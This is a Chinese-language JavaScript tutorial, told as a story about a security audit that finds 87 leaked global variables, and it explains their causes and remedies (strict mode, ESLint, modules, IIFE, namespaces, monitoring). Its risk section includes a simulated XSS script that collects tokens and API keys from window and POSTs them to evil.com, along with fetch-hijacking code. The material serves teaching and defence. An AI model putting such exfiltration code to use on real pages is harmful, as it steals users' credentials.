《第71次记录：全局对象污染事件 —— 安全审计中的惊人发现》

---

## 安全审计

周五下午两点，公司会议室里正在进行季度安全审计汇报。外部安全顾问张工打开投影，第一页PPT就让所有人倒吸一口凉气：

**"检测到87个未声明的全局变量，其中包含敏感信息"**

技术总监皱起眉头："87个？这怎么可能？我们不是有代码审查流程吗？"

张工切换到下一页，展示了扫描结果：

```javascript
// 全局作用域污染扫描结果（部分）
window.userId = "12345"
window.userToken = "eyJhbGciOiJIUzI1NiIsInR5cCI..."
window.apiKey = "sk_live_xxxxxxxxxxxxx"
window.password = "temp123"  // !!!
window.debugMode = true
window.currentUser = { name: "Alice", email: "alice@company.com" }
// ... 还有81个
```

"这些变量暴露在全局作用域，任何恶意脚本都能访问。"张工说，"更严重的是，有些敏感信息直接存在`window`对象上，这是严重的安全漏洞。"

你坐在会议桌旁，感到背后一阵发凉。作为前端负责人，你知道这意味着什么——全局污染不仅影响代码质量，更可能导致XSS攻击时的数据泄露。

张工继续说："我们用了一个简单的脚本扫描全局对象：

```javascript
// 扫描全局变量的脚本
function scanGlobalVariables() {
    const builtInProps = new Set([
        'window', 'document', 'location', 'navigator',
        'console', 'alert', 'setTimeout', 'setInterval',
        // ... 标准的全局属性
    ]);

    const customGlobals = [];

    for (let key in window) {
        if (window.hasOwnProperty(key) && !builtInProps.has(key)) {
            const value = window[key];
            const type = typeof value;

            // 检测敏感关键词
            const isSensitive = /password|token|secret|key|api/i.test(key);

            customGlobals.push({
                name: key,
                type: type,
                sensitive: isSensitive,
                value: isSensitive ? '[REDACTED]' : value
            });
        }
    }

    return customGlobals;
}

const result = scanGlobalVariables();
console.log(`发现 ${result.length} 个自定义全局变量`);
console.table(result);
```

"结果让我们震惊。87个自定义全局变量，其中19个包含敏感关键词。"

技术总监看向你："这是怎么造成的？"

你深吸一口气，知道必须立刻调查清楚。会议结束后，你回到工位，开始系统性地排查全局污染的根源。

---

## 全局污染

下午三点，你打开Chrome DevTools，在控制台输入扫描脚本，果然看到了触目惊心的结果。你决定逐一排查这些变量是怎么产生的。

**污染源1：忘记声明变量**

你用全局搜索找到第一个变量`userId`的来源：

```javascript
// auth.js (老代码，没有严格模式)
function loginUser(id, token) {
    userId = id; // 忘记用var/let/const声明!
    userToken = token; // 也忘记了!

    // 这两个变量意外地成为了全局变量
    saveToLocalStorage(userId, userToken);
}
```

"这是最经典的全局污染来源。"你在笔记本上记录，"没有声明的赋值会自动创建全局变量。"

你写了个简单的测试验证：

```javascript
function testGlobalCreation() {
    accidentalGlobal = '我是意外的全局变量';
}

testGlobalCreation();
console.log(window.accidentalGlobal); // '我是意外的全局变量'
console.log(accidentalGlobal); // 也能访问
```

**污染源2：函数内的错误作用域**

你找到第二个污染源：

```javascript
// utils.js
function processData(items) {
    for (var i = 0; i < items.length; i++) {
        // 本意是创建临时变量，但写错了
        temp = items[i].value; // 没有声明!
        processItem(temp);
    }
}

// 调用后，window.temp被污染了
processData([{value: 1}, {value: 2}]);
console.log(window.temp); // 2
```

**污染源3：闭包外的变量**

```javascript
// api.js
function makeRequest(url) {
    apiResponse = fetch(url); // 忘记声明，成为全局变量

    apiResponse.then(data => {
        console.log(data);
    });

    return apiResponse;
}
```

**污染源4：对象属性的错误引用**

```javascript
// config.js
const config = {
    apiUrl: 'https://api.example.com',
    timeout: 5000
};

// 本意是给config对象添加属性，但写错了
function updateConfig() {
    apiKey = 'sk_live_xxxxxx'; // 忘记写config.apiKey!
    // 结果创建了全局变量window.apiKey
}
```

下午四点，你统计了污染源分布：

```
污染源分析:
- 忘记声明变量: 45个 (52%)
- 拼写错误/作用域错误: 28个 (32%)
- 循环/闭包变量泄露: 10个 (11%)
- 其他: 4个 (5%)
```

"超过一半是忘记声明造成的。"你皱起眉头，"这完全可以通过严格模式和ESLint避免。"

---

## 安全漏洞

下午五点，你开始评估这些全局污染的安全影响。你打开一个新的测试文件，模拟恶意脚本攻击：

```javascript
// 模拟XSS攻击：恶意脚本可以轻易窃取全局变量
function maliciousScript() {
    // 收集所有敏感的全局变量
    const stolen = {
        userId: window.userId,
        userToken: window.userToken,
        apiKey: window.apiKey,
        currentUser: window.currentUser
    };

    // 发送到攻击者服务器
    fetch('https://evil.com/collect', {
        method: 'POST',
        body: JSON.stringify(stolen)
    });

    console.log('数据已窃取:', stolen);
}

// 如果页面存在XSS漏洞，这段代码可以轻易执行
maliciousScript();
```

"这太危险了。"你意识到问题的严重性，"一旦有XSS漏洞，所有全局变量都会暴露。"

你又发现了另一个问题——全局变量可以被任意修改：

```javascript
// 恶意脚本可以篡改全局变量
window.apiUrl = 'https://evil.com/fake-api'; // 重定向API请求
window.debugMode = true; // 启用调试模式，暴露更多信息
window.isAdmin = true; // 提升权限

// 甚至可以劫持函数
const originalFetch = window.fetch;
window.fetch = function(...args) {
    console.log('拦截请求:', args);
    // 窃取请求数据
    return originalFetch.apply(this, args);
};
```

你在白板上总结了全局污染的安全风险：

**风险1: 数据泄露**
- 敏感信息暴露在全局作用域
- XSS攻击可轻易窃取数据
- 浏览器扩展、第三方脚本可访问

**风险2: 数据篡改**
- 恶意脚本可修改全局变量
- 影响应用逻辑和安全机制
- 难以追踪和防范

**风险3: 函数劫持**
- 全局函数可被替换
- 中间人攻击变得容易
- 难以检测和恢复

**风险4: 命名冲突**
- 第三方库可能覆盖全局变量
- 应用功能异常难以调试
- 维护成本高

---

## 隔离方案

下午六点，你开始制定修复方案。首先是立即启用严格模式：

**方案1: 严格模式(Strict Mode)**

```javascript
// 在每个文件顶部添加
'use strict';

function testStrictMode() {
    // 严格模式下，未声明的变量赋值会报错
    undeclaredVar = 'test'; // ReferenceError: undeclaredVar is not defined
}

// 或者在函数级别启用
function strictFunction() {
    'use strict';
    accidentalGlobal = 'test'; // 报错
}
```

"严格模式是第一道防线。"你记录道，"它能立即捕获大部分未声明变量的错误。"

**方案2: ESLint规则**

你在项目根目录创建`.eslintrc.js`:

```javascript
module.exports = {
    rules: {
        // 禁止使用未声明的变量
        'no-undef': 'error',

        // 禁止隐式全局变量
        'no-implicit-globals': 'error',

        // 要求使用严格模式
        'strict': ['error', 'global'],

        // 禁止使用var
        'no-var': 'error',

        // 优先使用const
        'prefer-const': 'warn'
    },

    env: {
        browser: true,
        es6: true
    }
};
```

**方案3: 模块化隔离**

```javascript
// 老代码（全局污染）
// auth.js
function login(userId) {
    currentUser = { id: userId }; // 全局变量
}

function logout() {
    currentUser = null;
}

// 任何地方都能访问
console.log(window.currentUser);


// 新代码（模块化）
// auth.js (ES6 Module)
let currentUser = null; // 模块作用域，外部无法访问

export function login(userId) {
    currentUser = { id: userId }; // 不会污染全局
    return currentUser;
}

export function logout() {
    currentUser = null;
}

export function getCurrentUser() {
    return currentUser;
}

// main.js
import { login, getCurrentUser } from './auth.js';

login('user-123');
console.log(getCurrentUser()); // 通过导出的函数访问，不是全局变量
console.log(window.currentUser); // undefined - 无法直接访问模块内变量
```

**方案4: IIFE模式（兼容老代码）**

```javascript
// 对于无法立即模块化的老代码，使用IIFE包装
(function() {
    'use strict';

    // 所有变量都在函数作用域内
    let userId = null;
    let userToken = null;

    function login(id, token) {
        userId = id;
        userToken = token;
    }

    function logout() {
        userId = null;
        userToken = null;
    }

    // 只暴露必要的接口到全局
    window.AuthModule = {
        login: login,
        logout: logout
    };
})();

// 使用
AuthModule.login('user-123', 'token-xxx');
// 但无法访问内部变量
console.log(window.userId); // undefined - 被保护了
```

**方案5: 命名空间模式**

```javascript
// 为应用创建单一全局命名空间
window.MyApp = window.MyApp || {};

// 所有功能都在命名空间下
MyApp.Auth = (function() {
    'use strict';

    let currentUser = null;

    return {
        login(userId) {
            currentUser = { id: userId };
        },
        logout() {
            currentUser = null;
        },
        getCurrentUser() {
            return currentUser;
        }
    };
})();

MyApp.API = (function() {
    'use strict';

    const config = {
        baseURL: 'https://api.example.com'
    };

    return {
        request(endpoint) {
            return fetch(`${config.baseURL}${endpoint}`);
        }
    };
})();

// 使用：只有一个全局变量MyApp
MyApp.Auth.login('user-123');
MyApp.API.request('/users');
```

**方案6: 持续监控**

```javascript
// 开发环境：监控全局变量变化
if (process.env.NODE_ENV === 'development') {
    const initialGlobals = new Set(Object.keys(window));

    // 定期检查
    setInterval(() => {
        const currentGlobals = Object.keys(window);
        const newGlobals = currentGlobals.filter(
            key => !initialGlobals.has(key)
        );

        if (newGlobals.length > 0) {
            console.warn('检测到新的全局变量:', newGlobals);
            newGlobals.forEach(key => {
                console.warn(`  - window.${key} =`, window[key]);
            });
        }
    }, 5000);
}

// 生产环境：记录异常
window.addEventListener('error', (event) => {
    if (event.message.includes('not defined')) {
        // 可能是未声明变量造成的错误
        logToServer('GlobalPollutionError', {
            message: event.message,
            filename: event.filename,
            lineno: event.lineno
        });
    }
});
```

下午七点，你完成了修复方案文档，并开始逐个文件修复全局污染问题。

**修复进度**:
- ✅ 添加严格模式指令到所有JS文件
- ✅ 配置ESLint规则
- ✅ 修复45个忘记声明的变量
- ✅ 重构28个作用域错误
- ✅ 迁移核心模块到ES6 Modules
- ⏳ 剩余10个循环变量问题（明天修复）

---

## 全局对象知识

晚上八点，你整理了关于全局对象和作用域污染的核心知识：

**规则 1: 全局对象(Global Object)**

JavaScript有一个全局对象，在不同环境中名称不同：

```javascript
// 浏览器环境
console.log(window === globalThis); // true
console.log(window === self); // true
console.log(window === frames); // true

// Node.js环境
console.log(global === globalThis); // true

// Web Worker环境
console.log(self === globalThis); // true

// 通用访问方式（推荐）
console.log(globalThis); // 所有环境都支持(ES2020+)
```

**全局对象的特性**:
- 所有全局变量都是全局对象的属性
- 全局函数也是全局对象的方法
- 内置对象（如`Object`、`Array`）也是全局对象的属性

```javascript
// 这些声明是等价的（非严格模式）
var x = 10;
window.x = 10;
globalThis.x = 10;

// 但在严格模式或模块中，var不会创建全局对象属性
```

---

**规则 2: 隐式全局变量创建**

未声明的变量赋值会创建全局变量（非严格模式）：

```javascript
// 非严格模式
function createGlobal() {
    undeclared = 'global'; // 创建 window.undeclared
}

createGlobal();
console.log(window.undeclared); // 'global'

// 严格模式
'use strict';
function strictCreateGlobal() {
    undeclared = 'error'; // ReferenceError: undeclared is not defined
}
```

**常见陷阱**:

```javascript
// 陷阱1: 拼写错误
let userName = 'Alice';

function updateUser() {
    usrName = 'Bob'; // 拼写错误，创建了全局变量window.usrName
}

// 陷阱2: 链式赋值
function chainAssignment() {
    let a = b = 10; // 只有a是局部变量，b是全局!
    // 等价于: b = 10; let a = b;
}

// 正确写法
function correctChain() {
    let a = 10, b = 10; // 都是局部变量
}

// 陷阱3: 循环变量
function loopPollution() {
    for (i = 0; i < 10; i++) { // i没有声明，成为全局!
        console.log(i);
    }
}

// 正确写法
function correctLoop() {
    for (let i = 0; i < 10; i++) {
        console.log(i);
    }
}
```

---

**规则 3: 严格模式(Strict Mode)的保护**

严格模式提供多重保护机制：

```javascript
'use strict';

// 保护1: 禁止隐式全局变量
function test1() {
    undeclared = 10; // ReferenceError
}

// 保护2: 禁止删除不可删除的属性
function test2() {
    delete Object.prototype; // TypeError
}

// 保护3: 禁止重复参数名
function test3(a, a, b) { // SyntaxError
    return a + b;
}

// 保护4: 禁止八进制字面量
function test4() {
    let x = 010; // SyntaxError
}

// 保护5: 禁止with语句
function test5() {
    with (Math) { // SyntaxError
        console.log(PI);
    }
}
```

**启用严格模式的方式**:

```javascript
// 方式1: 全局严格模式（不推荐，可能影响第三方库）
'use strict';
// 整个脚本文件

// 方式2: 函数级严格模式（推荐）
function strictFunction() {
    'use strict';
    // 只在函数内启用
}

// 方式3: 模块自动启用（ES6 Modules）
// module.js
export function myFunction() {
    // ES6模块默认就是严格模式
    undeclared = 10; // ReferenceError
}
```

---

**规则 4: 模块作用域隔离**

ES6模块提供天然的作用域隔离：

```javascript
// auth.js (ES6 Module)
let privateToken = null; // 模块私有，外部无法访问

export function setToken(token) {
    privateToken = token;
}

export function getToken() {
    return privateToken;
}

// 外部无法直接访问privateToken
console.log(window.privateToken); // undefined


// main.js
import { setToken, getToken } from './auth.js';

setToken('secret');
console.log(getToken()); // 'secret'
console.log(window.privateToken); // undefined - 无法访问模块内部变量
```

**模块 vs 全局脚本**:

```javascript
// global-script.js (传统脚本)
<script src="global-script.js"></script>

var x = 10; // window.x
function foo() {} // window.foo


// module.js (ES6 Module)
<script type="module" src="module.js"></script>

var x = 10; // 不会创建window.x，只在模块内
function foo() {} // 不会创建window.foo
```

---

**规则 5: 命名空间模式**

在无法使用模块的环境，使用命名空间模式减少全局污染：

```javascript
// 模式1: 单一命名空间
const APP = {
    name: 'MyApp',
    version: '1.0.0',

    utils: {
        formatDate(date) {
            return date.toISOString();
        }
    },

    user: {
        currentUser: null,
        login(username) {
            this.currentUser = username;
        }
    }
};

// 只有一个全局变量APP
APP.user.login('Alice');
console.log(APP.utils.formatDate(new Date()));


// 模式2: 命名空间工厂
const createNamespace = (function() {
    const namespaces = {};

    return function(name) {
        if (!namespaces[name]) {
            namespaces[name] = {
                modules: {}
            };
        }
        return namespaces[name];
    };
})();

const app = createNamespace('MyApp');
app.modules.auth = {
    login() { /* ... */ }
};


// 模式3: IIFE + 命名空间
window.MyApp = window.MyApp || {};

MyApp.Auth = (function() {
    // 私有变量
    let token = null;

    // 公共接口
    return {
        login(username, password) {
            // 登录逻辑
            token = 'generated-token';
            return token;
        },

        logout() {
            token = null;
        },

        isLoggedIn() {
            return token !== null;
        }
    };
})();

// 使用
MyApp.Auth.login('user', 'pass');
```

---

**规则 6: 检测和防御全局污染**

**检测工具**:

```javascript
// 开发工具1: 全局变量快照
function captureGlobalSnapshot() {
    return Object.keys(window);
}

const before = captureGlobalSnapshot();

// 运行可能污染全局的代码
suspiciousCode();

const after = captureGlobalSnapshot();
const diff = after.filter(key => !before.includes(key));

if (diff.length > 0) {
    console.warn('新增全局变量:', diff);
}


// 开发工具2: 全局变量监控
function monitorGlobalChanges(callback) {
    const knownGlobals = new Set(Object.keys(window));

    const observer = setInterval(() => {
        Object.keys(window).forEach(key => {
            if (!knownGlobals.has(key)) {
                callback(key, window[key]);
                knownGlobals.add(key);
            }
        });
    }, 1000);

    return () => clearInterval(observer);
}

const stopMonitoring = monitorGlobalChanges((key, value) => {
    console.warn(`全局污染: window.${key} =`, value);
});


// 开发工具3: Object.freeze保护
if (process.env.NODE_ENV === 'development') {
    // 冻结关键全局对象，防止意外修改
    Object.freeze(Array.prototype);
    Object.freeze(Object.prototype);
    Object.freeze(Function.prototype);
}
```

**防御策略**:

```javascript
// 策略1: CSP (Content Security Policy)
// 在HTML中添加
<meta http-equiv="Content-Security-Policy"
      content="script-src 'self'; object-src 'none'">

// 策略2: 代码审查自动化
// package.json
{
    "scripts": {
        "lint": "eslint . --ext .js",
        "check-globals": "node scripts/check-globals.js"
    }
}

// scripts/check-globals.js
const fs = require('fs');
const { ESLint } = require('eslint');

const eslint = new ESLint({
    rules: {
        'no-undef': 'error',
        'no-implicit-globals': 'error'
    }
});

const results = await eslint.lintFiles(['src/**/*.js']);
const formatter = await eslint.loadFormatter('stylish');
console.log(formatter.format(results));


// 策略3: 运行时保护
const originalWindow = { ...window };

setInterval(() => {
    const added = Object.keys(window).filter(
        key => !originalWindow.hasOwnProperty(key)
    );

    if (added.length > 0 && process.env.NODE_ENV === 'production') {
        // 生产环境记录日志
        logToAnalytics('global-pollution', { keys: added });
    }
}, 10000);
```

---

周一上午，你向技术总监汇报了修复进展。经过周末的加班，87个全局变量已经全部清理完毕，所有模块都启用了严格模式，ESLint配置也已生效。

"这次事故给了我们深刻的教训。"技术总监说，"全局污染不仅是代码质量问题，更是安全隐患。"

你点点头："我们已经建立了三道防线：严格模式捕获隐式全局、ESLint在开发阶段检测、运行时监控发现异常。以后不会再出现这种问题了。"

外部安全顾问张工在复审后也表示满意："修复很彻底，而且建立了长效机制。这才是专业团队的做法。"

---

**事故档案编号**: FUNC-2024-1871
**影响范围**: 全局对象污染,作用域隔离,安全漏洞
**根本原因**: 未启用严格模式,缺少ESLint检查,隐式全局变量创建,命名冲突
**修复成本**: 中(修复87个全局变量,重构模块化),高(如果造成数据泄露)

这是JavaScript世界第71次被记录的全局对象污染事故。JavaScript的全局对象(window/global/globalThis)是所有全局变量和函数的容器。未声明的变量赋值会自动创建全局变量(非严格模式),这是常见的污染源。全局污染不仅导致命名冲突和维护困难,更可能造成严重的安全漏洞——敏感数据暴露、XSS攻击时的数据泄露、恶意脚本劫持。防御策略包括:启用严格模式(禁止隐式全局)、使用ESLint检查、模块化隔离作用域、命名空间模式、运行时监控。现代JavaScript开发应完全避免全局污染,使用ES6模块系统实现天然隔离。

---
